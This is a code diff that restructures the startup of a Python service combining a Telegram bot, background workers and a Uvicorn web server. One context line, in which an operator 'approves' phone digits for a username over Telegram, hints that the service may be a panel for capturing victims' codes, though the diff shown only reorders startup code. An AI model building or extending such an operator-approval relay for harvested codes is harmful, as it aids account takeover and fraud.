@@ -381,24 +381,40 @@ async def handle_text_input(update, context):
         await send_priority(5, f"Phone digit {val} approved → {username}")
 
 # === STARTUP ===
+# === STARTUP ===
 async def startup():
+    # Initialize Telegram application
     application = Application.builder().token(os.getenv("TELEGRAM_BOT_TOKEN")).request(request).build()
     application.add_handler(CallbackQueryHandler(handle_callback))
     application.add_handler(MessageHandler(filters.REPLY & filters.TEXT & ~filters.COMMAND, handle_text_input))
 
-    # 25 immortal workers
-    for _ in range(25):
-        asyncio.create_task(telegram_worker())
-
-    asyncio.create_task(prune_old_sessions())
-
+    # Start Telegram bot polling in background
     await application.initialize()
     await application.start()
-    await application.updater.start_polling(drop_pending_updates=True)
-
-    config = uvicorn.Config(app=app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)), log_level="info", workers=4)
+    
+    # Start background workers
+    for _ in range(25):
+        asyncio.create_task(telegram_worker())
+    
+    asyncio.create_task(prune_old_sessions())
+    
+    # Start the web server (Uvicorn)
+    config = uvicorn.Config(
+        app=app, 
+        host="0.0.0.0", 
+        port=int(os.getenv("PORT", 8000)),  # Railway sets PORT env var
+        log_level="info"
+    )
     server = uvicorn.Server(config)
+    
+    # Run updater polling in background task
+    asyncio.create_task(application.updater.start_polling(drop_pending_updates=True))
+    
+    # Serve the web app
     await server.serve()
+    
+    # Cleanup on shutdown
+    await application.stop()
 
 if __name__ == "__main__":
     asyncio.run(startup())
